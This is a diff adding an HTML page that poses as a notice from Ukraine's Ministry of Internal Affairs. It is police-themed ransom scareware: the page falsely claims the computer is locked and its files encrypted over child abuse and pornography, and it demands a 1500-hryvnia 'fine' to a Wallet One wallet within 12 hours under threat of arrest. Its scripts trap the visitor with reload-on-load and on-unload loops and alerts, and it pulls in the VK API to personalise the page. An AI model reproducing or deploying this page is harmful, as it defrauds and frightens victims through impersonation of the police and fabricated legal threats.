@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+        <title>Ваш комп’ютер Заблокований</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">        
+        
+        <link href='http://fonts.googleapis.com/css?family=Ubuntu:400,700&subset=cyrillic-ext' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css"/>
+        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css"/>
+        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css"/>
+        <link rel="stylesheet" type="text/css" href="index.css" media="all">
+		<link rel="shortcut icon" href="favicon.ico">
+		
+		<script src="jquery-1.11.1.min.js"></script>
+		<script type="text/javascript" src="//vk.com/js/api/openapi.js?115"></script>
+		
+
+				
+		
+        <script>
+            var phone = "+9(999)98766";
+            var price = "0000";
+
+            Date.prototype.toLocaleFormat = function(format) {
+	            var f = {y : this.getYear() + 1900,m : this.getMonth() + 1,d : this.getDate(),H : this.getHours(),M : this.getMinutes(),S : this.getSeconds()}
+	            for(k in f)
+		            format = format.replace('%' + k, f[k] < 10 ? "0" + f[k] : f[k]);
+	            return format;
+            };
+
+            var today = new Date().toLocaleFormat('%d.%m.%y');
+
+            function getRandom(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+
+            var number_p = getRandom(600000000, 699999999);
+
+        </script>
+
+        <script>		
+            onbeforeunload=function(){
+                location.reload();
+                alert("Ваш комп’ютер був заблокований з міркувань безпеки.Вся інформації на вашому комп'ютері заарештована. Усі  ваші файли зашифровані.  Протягом 12 годин кримінальну справу буде передано до суду.");
+                return "Ваш комп’ютер був заблокований з міркувань безпеки.Вся інформації на вашому комп'ютері заарештована. Усі  ваші файли зашифровані.  Протягом 12 годин кримінальну справу буде передано до суду.Ваш комп’ютер Заблокований\nза порушення закону України при перегляді порнографії!\nНе намагайтеся самостійно або за допомогою третіх осіб розблокувати комп’ютер-\nце загрожує Вам  кримінальною відповідальністю!";
+            };
+
+            onload=function(){
+                location.reload();
+            }			
+        </script>
+</head>
+<body>
+
+
+        <div class="container">
+            <div class="page-header clearfix">
+                <div class="pull-right">
+                    <h4>
+					Ваш IP: 82.211.223.3;<br>
+					Регiон: <br>
+					Мiсто: 
+					</h4>
+                    <!--
+                    <small>*Если Ваш регион не установлен по ИП адресу,<br/>для определение вашего местоположения будет<br/> использоваться внутренняя база данных провайдеров.</small>
+                    -->
+                </div>
+                <img src="mvd.gif" width="71" height="75" class="pull-left" style="height: 60px; margin-right: 20px;">
+                <h4 style="margin-top: 0px;">
+                    <font color="#000">
+                        МІНІСТЕРСТВО ВНУТРІШНІХ <br>
+                        СПРАВ УКРАЇНИ<br>
+                        <font style="color: red;">Вами був порушений Закон!</font>
+                    </font>
+                </h4>
+                
+            </div>
+
+
+            <div class="row">
+
+                <div class="col-lg-8">
+											
+		
+                    <small>
+                <h4>Постанова 74 АК № 752759627 від 12.12.2014 </h4>
+
+                <br>
+				
+				
+				<div class="block" id="vk-info-block" style="display:none">
+					<table>
+					<tr>
+						<td><span style="font-size: 11px; color: #2b587a; font-family: tahoma,verdana,arial,sans-serif,Lucida Sans; margin:0; padding:0;">Шановний(а)&nbsp;</span></td>
+						<td>
+							<div style="height:20px; margin-top:0px;  width:155px; overflow:hidden;">
+								<div style="position:relative; top:-29px; left:-40px;" id="vk_auth"></div>
+							</div>
+						</td>
+					</tr>
+					</table>
+				
+					
+					
+					<!--					
+					<div style="background-color: white; height: 15px; left: 40px; position: relative; top: -21px; width: 117px; z-index: 9999;"></div>
+					-->
+				</div>
+				
+				<span style="font-size: 11px; color: #2b587a; font-family: tahoma,verdana,arial,sans-serif,Lucida Sans; margin:0; padding:0;">Доводимо до Вашої уваги наступну інформацію:</span><br><br>
+                <font style="color: red;">МВС України було виявлено використання вашого комп'ютера з протиправною метою, а саме - перегляд та копіювання матеріалів,що містять елементи педофілії, насильства і гей-порно.</font>
+                <br><br>
+                Такі дії містять в собі склад адміністративного правопорушення передбаченого ст. 301 ККУ і тягнуть за собою накладення адміністративного стягнення у розмірі від 800 до 8000 грн, а в разі ухилення від сплати штрафу - кримінальну відповідальність за ст. 212 Кримінального кодексу України, в порядку, передбаченому ст. 31 КПК України.
+                <br><br>
+                <font style="color: red;">Постановою по справі про адміністративне правопорушення серія 74 АК № 752759627 від 12.12.2014 на Вас накладено адміністративний штраф у розмірі <strong>1500 гривень</strong>. Оплату штрафу Ви можете провести в будь-якому терміналі оплати мобільного зв'язку (розділ "Електронні гроші"- Єдиний гаманець  Wallet One), а так саме в терміналах самообслуговування ПриватБанку шляхом перерахування суми стягнення на спеціальний рахунок платіжної системи <strong>Wallet One (Єдиний гаманець) №164954265324 </strong>
+
+</b></font>
+                <br><br>
+                Після оплати штрафу на протязі доби Ви отримаєте повідомлення про успішну сплату штрафу та код розблокування, який необхідно ввести у поле нижче. У разі відмови від сплати штрафу - на підставі ч.2 ст. 41 КАС України і ст.31 КПК України - матеріали справи будуть передані до прокуратури для прийняття рішення щодо порушення кримінальної справи за фактом вчинення злочину передбаченого ст. 301 КК України, а до місця Вашого проживання буде негайно направлена слідчо-оперативна група для Вашого затримання!.
+
+                <br><br>
+
+               (1)Постанова згенерована автоматично роботом по виявленню порушень, пов’язаних з переглядом  та копіювання матеріалів,що містять елементи педофілії, насильства і гей-порно.<br>
+                (2)<b>На оплату штрафу Вам відведено 12 годин</b>
+            </small>
+
+                </div>
+
+                <div class="col-lg-4">
+                    <div class="clearfix">
+
+                        <h4 style="color: red;">На оплату штрафу Вам відведено 12 годин</h4>                           
+
+                        <hr>
+
+                        <h4>Оплата за допомогою терміналів Приватбанку</h4>
+                        <img src="352.jpg" style="width: 80px; margin: 10px;" class="pull-left">
+                        <p>
+                            <small>У терміналі оберіть "Оплата послуг" ==> "Телекомунікації"==>"Інтернет".
+							Вибрати «Диджитал Пеймент Систем ООО». (Єдиний Гаманець)
+                            Набрати спеціальний гаманець <strong>№164954265324</strong>  
+</b><br>
+                            Внести купюри у приймач та натиснути "сплатити".<br>
+                            На протязі доби Ви отримаєте повідомлення про успішну сплату штрафу та код розблокування.<br><br>
+                            Сума до сплати: <b style="font-size: 16px;"> <strong>1500 грн</strong></b><br>
+                            *Увага! Термінал може стягувати додаткову комісію.
+                      </small></p><small>
+                    </small></div><small>
+
+                    <hr>
+
+                    <p>
+                        </p><form action="/" class="form-inline" role="form">
+                            <div class="form-group">
+                                <label class="sr-only" for="code">Код для розблокування</label>
+                                <input class="form-control input-sm" id="exampleInputEmail2" placeholder="Введіть код" type="email">
+                            </div>
+                            <div class="form-group">
+                            <button type="submit" class="btn btn-primary btn-">Розблокувати</button></div>
+                        </form>
+                    <p></p>
+
+                </small></div><small>
+
+            </small></div><small>
+
+
+        </small></div>
+</body>
+</html>
